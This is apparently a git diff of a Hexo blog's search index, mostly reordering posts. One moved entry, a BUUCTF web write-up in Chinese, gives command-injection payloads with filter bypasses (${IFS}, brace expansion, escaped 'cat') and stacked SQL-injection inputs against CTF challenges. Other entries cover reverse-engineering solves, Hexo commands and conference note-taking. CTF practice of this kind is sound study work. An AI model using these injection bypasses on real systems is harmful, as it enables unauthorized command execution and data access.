@@ -463,6 +463,54 @@ DOM 监听：MutationObserver 监听动态元素，实时更新样式
       </tags>
   </entry>
   <entry>
+    <title>BUUCTF Web wp</title>
+    <url>/2024/08/16/BUUCTF-Web-wp/</url>
+    <content><![CDATA[[ACTF2020 新生赛]Exec
+输入127.0.0.1;ls
+
+发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
+最终在127.0.0.1;cd ../../../;ls找到了flag文件
+
+输入127.0.0.1;cd ../../../;ls得到flag
+
+flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
+[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
+根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
+
+得知不能输入空格
+
+所以我们需要绕过空格使用一下平替
+$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
+输入/?ip=127.0.0.1;cat$IFS1flag.php
+
+我们查看index.php
+
+使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
+F12即可得到flag
+
+;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
+flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
+[SUCTF 2019]EasySQL
+堆叠注入查询数据库
+1; show databases;
+
+查询表名
+
+1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
+尝试访问Flag，发现不行
+输入*,1
+
+这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
+flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
+[强网杯 2019]随便注]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF RE wp</title>
     <url>/2024/08/13/BUUCTF-RE-wp/</url>
     <content><![CDATA[easyre
@@ -531,54 +579,6 @@ shift+F12看到flag
 import base64s = [  101, 51, 110, 105, 102, 73, 72, 57, 98, 95,   67, 64, 110, 64, 100, 72]flag = &quot;&quot;for i in range(len(s)):    flag += chr(s[i]-i)print( flag )print( base64.b64decode(flag) )
 flag:flag&#123;i_l0ve_you&#125;
 ]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF Web wp</title>
-    <url>/2024/08/16/BUUCTF-Web-wp/</url>
-    <content><![CDATA[[ACTF2020 新生赛]Exec
-输入127.0.0.1;ls
-
-发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
-最终在127.0.0.1;cd ../../../;ls找到了flag文件
-
-输入127.0.0.1;cd ../../../;ls得到flag
-
-flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
-[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
-根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
-
-得知不能输入空格
-
-所以我们需要绕过空格使用一下平替
-$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
-输入/?ip=127.0.0.1;cat$IFS1flag.php
-
-我们查看index.php
-
-使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
-F12即可得到flag
-
-;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
-flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
-[SUCTF 2019]EasySQL
-堆叠注入查询数据库
-1; show databases;
-
-查询表名
-
-1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
-尝试访问Flag，发现不行
-输入*,1
-
-这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
-flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
-[强网杯 2019]随便注]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -2550,21 +2550,6 @@ https://blog.csdn.net/timberman666/article/details/132723352
       </tags>
   </entry>
   <entry>
-    <title>hexo usage</title>
-    <url>/2024/05/23/hexo-usage/</url>
-    <content><![CDATA[hexo s  #启动并预览
-hexo c  #清除缓存文件 db.json 和已生成的静态文件 public 
-hexo g  #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写) 
-hexo d  #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)
-]]></content>
-      <categories>
-        <category>工具与技术使用</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buuoj古典密码学wp</title>
     <url>/2024/09/24/buuoj%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6wp/</url>
     <content><![CDATA[此博客用于整理，之前做过的古典密码学题目
@@ -3089,6 +3074,21 @@ flag:utflag&#123;d4nger0us_c1pherText_qq&#125;
       </categories>
       <tags>
         <tag>cryptoCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo usage</title>
+    <url>/2024/05/23/hexo-usage/</url>
+    <content><![CDATA[hexo s  #启动并预览
+hexo c  #清除缓存文件 db.json 和已生成的静态文件 public 
+hexo g  #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写) 
+hexo d  #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)
+]]></content>
+      <categories>
+        <category>工具与技术使用</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -5570,6 +5570,161 @@ ctf就不用说了，现在研究的一直是密码学相关内容
       </tags>
   </entry>
   <entry>
+    <title>思考学术会议如何听才能最大化利用</title>
+    <url>/2025/11/11/%E6%80%9D%E8%80%83%E5%AD%A6%E6%9C%AF%E4%BC%9A%E8%AE%AE%E5%A6%82%E4%BD%95%E5%90%AC%E6%89%8D%E8%83%BD%E6%9C%80%E5%A4%A7%E5%8C%96%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[今天上午捣鼓arch下的hexo博客工作流，感觉没有typora的话插入图片怪怪的，然后配置了一下批量路径转化，虽然还是没那么好用但是起码能用了，单个文件就用传统老办法吧没办法
+然后同学指出一点，我把一百多张图片放博客里面太抽象了
+后续我思考了一下，拍了ppt≠会看，不一定会有提升
+故而需要1.一个比较好的工作流，可以高效读取会议讲了什么；2.一个框架，来评判会议讲的好不好；3.一个总结，来总结自己学到了什么
+最终需要复盘的，只有第三点是关键
+然后丢给gpt给了个大概可以用的，可以参考一下（取其精华去其糟粕）
+一、会议学习工作流（从照片到知识）阶段 1：整理与提取 目标 ：从照片、PPT、笔记中提炼出可读的“信息流”。
+
+
+
+
+步骤
+工具/方法
+输出
+
+
+
+
+1. 整理照片
+按议题/讲者分文件夹命名，如 Day1_Session2_李教授_图像识别.ppt
+分类清晰的文件夹
+
+
+2. OCR识别文字
+用 Notion AI、ChatGPT Vision 或 PaddleOCR 批量提取幻灯片文字
+文本版本的讲稿概要
+
+
+3. 初步摘要
+每个报告提炼出：主题、主要问题、方法、结果、结论
+每篇 5~8 行摘要
+
+
+4. 汇总表格
+用 Excel/Notion 建立“会议笔记表”
+一页总览所有报告内容
+
+
+
+
+
+PPT还是要拍（不然确实太闲了哇），然后直接丢给豆包总结一下，最终得到这一个报告的精髓部分
+
+阶段 2：深度理解 目标 ：从“知道讲了什么”到“理解为什么”。
+问自己三个问题
+1️⃣ 这场报告试图解决什么问题？（Problem）
+ 2️⃣ 他是如何解决的？（Approach） 
+3️⃣ 有什么新的洞见或不足？（Insight / Limitation）
+把这三问放在每个报告摘要后。
+阶段 3：连接与应用 目标 ：把会议内容与自己的研究/工作连接起来。
+
+
+
+
+步骤
+思考方向
+
+
+
+
+1. 找到与你方向最接近的3场报告
+有哪些可以借鉴的模型、方法或实验设计？
+
+
+2. 找到最远的3场报告
+有没有启发新的思路或跨界应用？
+
+
+3. 列一个“Follow-up计划”
+想去查阅的论文、想联系的讲者、想尝试的想法
+
+
+
+
+🎯 二、会议质量评判框架一个实用的五维评估模型，可以量化会议的“含金量”：
+
+
+
+
+维度
+关键问题
+评分标准（1~5）
+
+
+
+
+内容深度
+是否提供原创研究或独到见解？
+1=泛泛而谈，5=深度技术细节
+
+
+逻辑清晰
+问题、方法、结果是否连贯？
+1=混乱，5=层次分明
+
+
+表达效果
+演讲是否生动、有图有例？
+1=照念PPT，5=引人入胜
+
+
+相关性
+是否与你研究/领域密切相关？
+1=无关，5=高度相关
+
+
+可应用性
+是否能启发或应用于实际工作？
+1=无启发，5=可立即应用
+
+
+
+
+→ 平均分即为该报告或会议的“有效收获指数”。
+→ 可以用 Notion、Excel 或 Obsidian 表格记录，长期积累后，你能直观看出哪类会议最值得去。
+🧠 三、自我总结模板（真正的“学习输出”）可以用以下结构写一份会议复盘：
+🏷️ 基本信息
+会议名称 / 时间 / 地点
+参会目的（例如：了解领域趋势 / 寻找合作机会）
+
+📚 内容回顾
+我印象最深的 3 个报告
+我认为最有价值的观点
+我不同意或存疑的部分
+
+🔍 反思与启发
+对我现有研究/工作的启示
+我发现自己知识上的空白
+想进一步了解的问题或方向
+
+🚀 后续行动
+要阅读的论文/资料列表
+要联系的专家/团队
+要尝试的新方法/工具
+
+🌱 小结
+会议真正的价值不在“听到多少”，而在“消化多少”。
+
+用上面的体系：
+
+工作流帮你从 信息混乱 → 有序提炼 ；
+评估框架让你从 听众 → 批判性学习者 ；
+总结模板让你从 收集 → 创造价值 。
+
+]]></content>
+      <categories>
+        <category>一点小思考</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>括号书写规范</title>
     <url>/2024/09/09/%E6%8B%AC%E5%8F%B7%E4%B9%A6%E5%86%99%E8%A7%84%E8%8C%83/</url>
     <content><![CDATA[今天记笔记，遇到一段话，中英夹杂不知道应当如何使用括号
@@ -6875,7 +7030,6 @@ reference：Identity-based chameleon hashing and signatures without key exposure
       </categories>
       <tags>
         <tag>游记</tag>
-        <tag>unfixed</tag>
         <tag>meeting</tag>
       </tags>
   </entry>
@@ -7908,6 +8062,19 @@ https://github.com/azl397985856/cf
       </tags>
   </entry>
   <entry>
+    <title>计算机组成原理学习笔记</title>
+    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[
+
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研专业课</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>荔枝橙味拱腰觅马糕守</title>
     <url>/2024/09/11/%E8%8D%94%E6%9E%9D%E6%A9%99%E5%91%B3%E6%8B%B1%E8%85%B0%E8%A7%85%E9%A9%AC%E7%B3%95%E5%AE%88/</url>
     <content><![CDATA[本篇文章旨在记录笔者阅读《公钥密码方案构造及安全证明的知识要点和方法论》的学习总结和收获
@@ -8547,19 +8714,6 @@ $Decrypt:(SP,pk,M,CT)\rightarrow M/\perp$，其中，$\perp$ 代表解密失败
       <tags>
         <tag>Crypto</tag>
         <tag>常驻</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机组成原理学习笔记</title>
-    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[
-
-]]></content>
-      <categories>
-        <category>考研</category>
-      </categories>
-      <tags>
-        <tag>考研专业课</tag>
       </tags>
   </entry>
   <entry>
